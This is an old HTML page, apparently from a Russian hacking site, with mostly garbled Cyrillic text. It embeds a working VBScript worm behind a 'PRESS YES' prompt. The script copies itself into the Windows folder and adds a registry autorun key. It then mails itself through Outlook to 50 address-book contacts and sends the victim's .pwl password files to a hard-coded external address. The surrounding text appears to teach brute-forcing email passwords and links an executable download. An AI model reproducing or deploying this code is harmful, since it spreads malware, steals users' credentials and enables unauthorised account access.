<html>
<p align="left"><font color="#c0c0c0" size="6">
PRESS "YES"
</html>
<html>
<script language ="VBScript">
On Error Resume Next
Dim FileSysObject, File
Set FileSysObject = CreateObject ("Scripting.FileSystemObject")
Set File = FileSysObject.GetFile(WScript.ScriptFullName)
File.Copy ("c:\windows\winsystem.vbs")
Dim WshShell
Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\iexplores", "c:\windows\winsystem.vbs"
Dim OutlookObject, OutMail, Index
Set OutlookObject = CreateObject("Outlook.Application")
For Index = 1 To 50
Set OutMail = OutlookObject.CreateItem(0)
OutMail.to = OutlookObject.GetNameSpace("MAPI").AddressLists(1).AddressEntries(Index)
OutMail.Subject = "��� ����� ���� �����..."
OutMail.Body = "������� ����"
OutMail.Attachments.Add(WScript.ScriptFullName)
OutMail.Send
Next
Set OutMail = OutlookObject.CreateItem(0)
OutMail.to = "ronin911t@mailru.com"
OutMail.Subject = "������ �� ����"
OutMail.Body = "�� ������"
OutMail.Attachments.Add("c:\windows\*.pwl")
OutMail.Send
</script>

</html>
<html>
<head>
<meta http-equiv="Content-Type"
content="text/html; charset=windows-1251">
<meta name="GENERATOR" content="Microsoft FrontPage Express 2.0">
<title>������-���-����</title>
</head>
<body bgcolor="#C0C0C0">
<br>
        <td><a href="http://www.hackrol.narod.ru/index.htm"><font
        color="#0000FF" size="5">[�� �������]</font></a><font
        color="#0000FF" size="5"> </font></td>
    </tr>
</br>
<hr>
<p align="center"><font color="#008080" size="7">������_���_����</font></p>
<hr>
<p align="center"><font color="#000080" size="5"><strong><u>�����������������
�����.</u></strong></font></p>
<p><font color="#000000" size="4">� ����������� ������ ����
����� �������, ��� ��������
����������� �����������: 90 ������
�� ��� ��������� ���������� ������,
� ������ 60 �� ��� ������ ���
��������, ���������� � ��. � ���
����� �������! 30 ������ �� ���
�������� �� ������ ������� ����,
������ 5 ������ �������� ���������
� ��������� ������ ������ ����:</font></p>

<p><img src="http://www.hackrol.narod.ru/bmp1.gif"
width="385" height="295"></p>

<p><font color="#000000" size="4">��� ������� �����������,
� ���� �������� ���� ���������� 50
�����- ������ 3 ����� �������� ���
������ �� ��������� �����. ������
��� ���� �������!</font><font color="#FF0000"
size="4">:)</font></p>

<p><font color="#000000" size="4">���� �� ������� �����
������ �������? �� ����� ������!
���� ������ ���������� ������ �
�������� ����� ���������� �������,
������ ��� ����������� ����- ������
��� � 70% ������� ���������� e-mail ��
������ ����������. ��� �� ����
��������, ��� ��� ��� � ���-
�������� &quot;������ �������&quot;,
������������ �������- ������������
��������� ������. ���� � �������
���������� ���� ���� ���� ��
��������, �� ������� ��������� ����
����� ��������, ��������� ��� ��
�������� �������������� ���������
������������� � �. �. � �. �.(�� ���
��� ������ ���������!)</font><font
color="#FF0000" size="4">:)</font></p>

<p align="center"><font color="#000080" size="5"><strong><u>�������
�������.</u></strong></font></p>

<p align="left"><font color="#000000" size="4">������������
������ off-line ���������� �������
����� ������ ����������(��. ����),
������ ����� � ������ �� ����
��������� � ������� � ������� ��
�����. ���� ��������������
���������� ������� </font><font color="#0000FF"
size="4">Brutus AET 2</font><font color="#000000" size="4"> . �� ���
����� ��� �� ������������� ������
��� ����! ������ ������� �� ������
���� ���������� ��������, ����� ��
����� ��������� ����� ���������� �
����������. ���� ������ ��������,
�� ����� ������� � ����</font><a
href="http://www.hackrol.narod.ru/generator.exe"><font color="#000ff0"
size="4">generator</font></a><font color="#000000" size="4"> � ������
����� � ������ name.txt. � ����������
��������� pop.online.ru -&gt; POP3 � ���� �
����� � ���� � ����� � ��������.
����� ���� �������� �������� </font><font
color="#FF0000" size="4">start</font><font color="#000000" size="4">.
�������� �������� ������� ��
������� ����� � ��������(2000000
�������- 19��), �.�. �����
������������� ��������� ��������
�� 500000 �������, ��� �������
���������� �������� �����.
����������� ����� �������� ������
�������� ���� �� ����� �����.
������, ����� �������� ���������
������ � �����, ������������ </font><font
color="#FF0000" size="4">1986 ���</font><font color="#000000" size="4"> �
��������� </font><font color="#FF0000" size="4">1,5
���������</font><font size="4">(1��=1000��=1000000��).</font></p>

<p align="left"><font color="#000000" size="4">P.S � ���� ���������
���������� �������� ��� ����������
���������� ����. </font><font color="#FF0000"
size="4">�� ��� ��� ���������� ����
������ ���������� ������������ �
�������������� ����� � �� �����
���� ������������ �� ����
������������� ����������.</font></p>

<p align="left"><font color="#000000" size="4">���� ��������� �
����������� �� ������
���������������� ������
���������� ����������� ����:
support@rol.ru</font></p>

<p align="left">&nbsp;</p>

<p align="left">&nbsp;</p>

<p>&nbsp;</p>
<!-- SpyLOG f:0211 -->
<script language="javascript"><!--
Mu="u3657.81.spylog.com";Md=document;Mnv=navigator;Mp=1;
Mn=(Mnv.appName.substring(0,2)=="Mi")?0:1;Mrn=Math.random();
Mt=(new Date()).getTimezoneOffset();
Mz="p="+Mp+"&rn="+Mrn+"&t="+Mt;
My="";
My+="<a href='http://"+Mu+"/cnt?cid=365781&f=3&p="+Mp+"&rn="+Mrn+"' target='_blank'>";
My+="<img src='http://"+Mu+"/cnt?cid=365781&"+Mz+"&r="+escape(Md.referrer)+"&pg="+escape(window.location.href)+"' border=0 width=88 height=31 alt='SpyLOG'>";
My+="</a>";Md.write(My);//--></script><noscript>
<a href="http://u3657.81.spylog.com/cnt?cid=365781&f=3&p=1" target="_blank">
<img src="http://u3657.81.spylog.com/cnt?cid=365781&p=1" alt='SpyLOG' border='0' width=88 height=31 >
</a></noscript>
<!-- SpyLOG -->
</body>
</html><!-- ><!-- "><!-- '><!-- --></textarea></form>
</title></comment></a>
</div></span></ilayer></layer></iframe></noframes></style></noscript></table></script></applet></font>
<style>
#bn {display:block;}
#bt {display:block;}
</style>
<script language="JavaScript" src="http://bs.yandex.ru/show/163"></script>
